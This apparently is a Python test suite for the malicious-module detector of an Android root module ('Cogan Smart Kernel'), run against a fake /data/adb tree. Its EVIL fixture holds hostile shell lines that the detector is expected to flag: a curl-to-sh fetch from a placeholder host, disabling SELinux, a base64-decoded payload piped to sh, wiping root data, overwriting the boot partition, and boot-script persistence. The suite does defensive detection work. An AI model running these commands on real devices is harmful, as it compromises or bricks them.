#!/usr/bin/env python3
"""Offline tests for the module guard of Cogan Smart Kernel (guard/report.sh + guard.awk) against a
fake /data/adb and ps: what it flags, the whitelist, and removal down to the roots."""
import json
import shlex
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

from test_cogan_smart_power import AWK, MODULE, SHELL, write

EVIL = """#!/system/bin/sh
# curl x | sh   (a comment is not behaviour)
curl -s http://x.example/p.sh | sh
setenforce 0
echo $(echo aGk= | base64 -d) | sh
rm -rf /data/adb/ksu/modules.img
dd if=/sdcard/x of=/dev/block/by-name/boot
cp /sdcard/a.sh /data/adb/service.d/a.sh
touch /data/adb/modules/good/disable
printf '\\033[31mred\\033[0m'
"""
GOOD = """#!/system/bin/sh
cat /data/adb/ksu/x 2>/dev/null
dd if=/dev/block/by-name/boot of=/sdcard/boot.img
MODDIR=/data/adb/modules/good
"""


class Phone:
    def __init__(self, base, awk=AWK):
        self.adb, self.bin = base / "adb", base / "bin"
        mods = self.adb / "modules"
        write(mods / "evil/module.prop", "id=evil\nname=Evil\nversion=1\nauthor=x\ndescription=bad\r\n")
        write(mods / "evil/service.sh", EVIL)
        write(mods / "evil/sepolicy.rule", "allow * * * *\nallow untrusted_app * file read\n")
        write(mods / "evil/system.prop", "ro.debuggable=1\n")
        (mods / "evil/system/bin").mkdir(parents=True)
        (mods / "evil/system/bin/tool").write_bytes(b"\x7fELF\x02\x01\x01\x00")
        (mods / "evil/zero").symlink_to("/dev/zero")   # must never be read
        write(mods / "good/module.prop", "id=good\nname=Good\nversion=2\nauthor=y\ndescription=fine\n")
        write(mods / "good/service.sh", GOOD)
        write(mods / "nomount/module.prop", "id=nomount\nname=NoMount\nversion=v2.1.1\nmetamodule=1\n")
        write(mods / "cogan_smart/module.prop", "id=cogan_smart\nname=Cogan Smart Kernel\nversion=v2.2\n")
        write(mods / "cogan_smart/service.sh", "echo 1 > /sys/devices/system/cpu/cpufreq/policy7/scaling_max_freq\n")
        write(mods / "tweak/module.prop", "id=tweak\nname=Tweak\nversion=1\nauthor=t\n")
        write(mods / "tweak/service.sh", "echo 1500000 > /sys/devices/system/cpu/cpufreq/policy7/scaling_max_freq\n"
                                         "stop mi_thermald\ncat /sys/class/thermal/thermal_zone0/temp\n")
        write(self.adb / "modules_update/evil/module.prop", "id=evil\nname=Evil\nversion=2\n")
        write(self.adb / "modules_update/fresh/module.prop", "id=fresh\nname=Fresh\nversion=1\nauthor=z\n")
        write(self.adb / "service.d/a.sh", "sh /data/adb/modules/evil/service.sh\n")
        write(self.adb / "service.d/evil2.sh", "sh /data/adb/modules/evil2/x.sh\n")   # a longer id
        write(self.adb / "evil/keys.txt", "secret\n")
        write(self.adb / "junk/daemon", "x\n")
        write(self.adb / "ksu/.allowlist", "")
        self.bin.mkdir()
        # Toybox-style ps: header, then PID and the full command line.
        write(self.bin / "ps.txt", f"""  PID ARGS
    1 /init
  123 sh {self.adb}/modules/evil/service.sh
  124 {self.adb}/junk/daemon x
  125 sh {self.adb}/modules/cogan_smart/guard/report.sh scan
  126 awk -v ADB={self.adb} -f {self.adb}/modules/cogan_smart/guard/guard.awk
""")
        write(self.bin / "ps", f'#!/bin/sh\ncat {self.bin / "ps.txt"}\n')
        (self.bin / "ps").chmod(0o755)
        (self.bin / "awk").symlink_to(awk)
        self.killed = self.bin / "killed"
        # Record kills instead of signalling whatever has these pids on the test machine.
        write(self.bin / "fake-kill", f'#!/bin/sh\necho "$@" >> {self.killed}\n')
        (self.bin / "fake-kill").chmod(0o755)

    def run(self, *args):
        env = {"PATH": f"{self.bin}:/usr/bin:/bin", "CS_ADB": str(self.adb), "CG_KILL": str(self.bin / "fake-kill")}
        result = subprocess.run([SHELL, str(MODULE / "guard/report.sh"), *args], env=env,
                                capture_output=True, text=True, timeout=60)
        if result.returncode:
            raise AssertionError(result.stderr)
        return json.loads(result.stdout)


def awks(base):
    found = {AWK}
    for name in ("original-awk", "mawk", "gawk"):
        if path := shutil.which(name):
            found.add(path)
    if busybox := shutil.which("busybox"):
        write(base / "busybox-awk", f'#!/bin/sh\nexec {shlex.quote(busybox)} awk "$@"\n')
        (base / "busybox-awk").chmod(0o755)
        found.add(str(base / "busybox-awk"))
    return sorted(found)


class ScanTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.phone = Phone(Path(self.tmp.name))

    def tearDown(self):
        self.tmp.cleanup()

    def scan(self):
        return self.phone.run("scan")

    def test_same_report_with_every_awk(self):
        reports = []
        for awk in awks(Path(self.tmp.name)):
            with tempfile.TemporaryDirectory() as tmp:
                phone = Phone(Path(tmp), awk)
                text = json.dumps(phone.run("scan")).replace(str(phone.adb), "ADB")
                reports.append((awk, text))
        for awk, text in reports[1:]:
            self.assertEqual(text, reports[0][1], awk)

    def test_flags_what_a_bad_module_does_with_its_evidence(self):
        evil = {m["id"]: m for m in self.scan()["modules"]}["evil"]
        codes = {f["code"]: f["level"] for f in evil["flags"]}
        for code in ("fetch_exec", "selinux", "hidden_exec", "root_tamper", "partition", "policy_all"):
            self.assertEqual(codes[code], 2, code)
        for code in ("persist", "other_modules", "secprop", "sys_bin", "policy_wide"):
            self.assertEqual(codes[code], 1, code)
        self.assertEqual((evil["risk"], evil["description"]), (2, "bad"))
        self.assertIn({"code": "fetch_exec", "at": "service.sh:3", "line": "curl -s http://x.example/p.sh | sh"}, evil["hits"])
        self.assertIn({"code": "elf", "at": "system/bin/tool", "line": ""}, evil["hits"])
        self.assertEqual(evil["roots"], ["service.d/a.sh"])
        self.assertEqual((evil["update"], evil["data"]), (1, 1))
        self.assertEqual([p.split()[0] for p in evil["procs"]], ["123"])

    def test_a_second_cpu_or_thermal_controller_is_a_conflict_but_not_cogan_smart_itself(self):
        report = self.scan()
        mods = {m["id"]: m for m in report["modules"]}
        hits = [h for h in mods["tweak"]["hits"] if h["code"] == "conflict"]
        self.assertEqual([h["at"] for h in hits], ["service.sh:1", "service.sh:2"])
        self.assertNotIn("conflict", {f["code"] for f in mods["cogan_smart"]["flags"]})
        # Device ⇄ kernel ⇄ module: the tab shows the same identity as the power and thermal tabs.
        self.assertIn("verified", report["kernel"])
        self.assertIn("match", report["device"])

    def test_reading_and_backups_are_not_flagged(self):
        good = {m["id"]: m for m in self.scan()["modules"]}["good"]
        self.assertEqual((good["risk"], good["flags"], good["roots"]), (0, [], []))

    def test_root_manager_metamodule_and_self_are_whitelisted(self):
        report = self.scan()
        mods = {m["id"]: m for m in report["modules"]}
        self.assertEqual(report["meta"], "nomount")
        self.assertEqual({i for i, m in mods.items() if m["core"]}, {"nomount", "cogan_smart"})
        self.assertEqual(mods["fresh"]["state"], "install")
        boot = {b["name"]: b for b in report["boot"]}
        self.assertEqual(boot["evil2.sh"]["modules"], ["evil2"])
        owners = {e["name"]: e["owner"] for e in report["entries"]}
        self.assertEqual((owners["ksu"], owners["evil"], owners["junk"]), ("core", "evil", ""))
        self.assertEqual([s.split()[0] for s in report["strays"]], ["124"])   # not the scan itself

    def test_whitelist(self):
        self.phone.run("trust", "evil")
        self.assertEqual(self.phone.run("remove", "evil")["ok"], 0)
        self.assertTrue({m["id"]: m for m in self.scan()["modules"]}["evil"]["trusted"])
        self.assertEqual(self.phone.run("untrust", "nomount")["ok"], 0)
        self.phone.run("untrust", "evil")
        self.assertFalse({m["id"]: m for m in self.scan()["modules"]}["evil"]["trusted"])

    def test_refuses_core_and_unsafe_names(self):
        for args in (("remove", "nomount"), ("remove", "cogan_smart"), ("disable", "nomount"),
                     ("remove", ".."), ("remove", "../ksu"), ("trust", "missing"),
                     ("rmscript", "..", "a.sh"), ("rmscript", "service.d", ".."),
                     ("rmentry", "ksu"), ("rmentry", "evil"), ("rmentry", "..")):
            self.assertEqual(self.phone.run(*args)["ok"], 0, args)
        self.assertTrue((self.phone.adb / "ksu").is_dir())

    def test_disable_and_enable_use_the_root_manager_flag(self):
        flag = self.phone.adb / "modules/good/disable"
        self.phone.run("disable", "good")
        self.assertTrue(flag.exists())
        self.phone.run("enable", "good")
        self.assertFalse(flag.exists())

    def test_remove_down_to_the_roots_then_data_after_reboot(self):
        adb = self.phone.adb
        result = self.phone.run("remove", "evil", "data")
        self.assertEqual((result["ok"], result["stopped"], result["scripts"], result["data"], result["reboot"]),
                         (1, 1, ["service.d/a.sh"], 1, 1))
        self.assertEqual(self.phone.killed.read_text().split(), ["-9", "123"])
        self.assertTrue((adb / "modules/evil/remove").exists())
        self.assertTrue((adb / "modules/evil/disable").exists())
        self.assertFalse((adb / "modules_update/evil").exists())
        self.assertFalse((adb / "service.d/a.sh").exists())
        self.assertTrue((adb / "service.d/evil2.sh").exists())
        # Its uninstall.sh may still need the data: nothing is deleted before the root manager runs it.
        self.phone.run("boot")
        self.assertTrue((adb / "evil/keys.txt").exists())
        shutil.rmtree(adb / "modules/evil")   # what the root manager does at the reboot
        self.phone.run("boot")
        self.assertFalse((adb / "evil").exists())
        self.assertFalse((adb / "cogan_smart/guard/purge").exists())

    def test_keep_undoes_remove_and_keeps_data(self):
        adb = self.phone.adb
        self.phone.run("remove", "evil", "data")
        self.phone.run("keep", "evil")
        self.assertFalse((adb / "modules/evil/remove").exists())
        self.phone.run("boot")
        self.assertTrue((adb / "evil/keys.txt").exists())

    def test_pending_install_is_dropped_at_once(self):
        result = self.phone.run("remove", "fresh")
        self.assertEqual((result["ok"], result["reboot"]), (1, 0))
        self.assertFalse((self.phone.adb / "modules_update/fresh").exists())

    def test_boot_script_and_unknown_entry(self):
        self.assertEqual(self.phone.run("rmscript", "service.d", "evil2.sh")["ok"], 1)
        self.assertFalse((self.phone.adb / "service.d/evil2.sh").exists())
        self.assertEqual(self.phone.run("rmentry", "junk")["ok"], 1)
        self.assertFalse((self.phone.adb / "junk").exists())

    def test_entry_used_by_a_module_is_kept(self):
        write(self.phone.adb / "pif.json", "{}")
        write(self.phone.adb / "modules/good/service.sh", "cat /data/adb/pif.json\n")
        self.assertEqual({e["name"]: e["owner"] for e in self.scan()["entries"]}["pif.json"], "good")
        self.assertEqual(self.phone.run("rmentry", "pif.json")["ok"], 0)


if __name__ == "__main__":
    unittest.main()
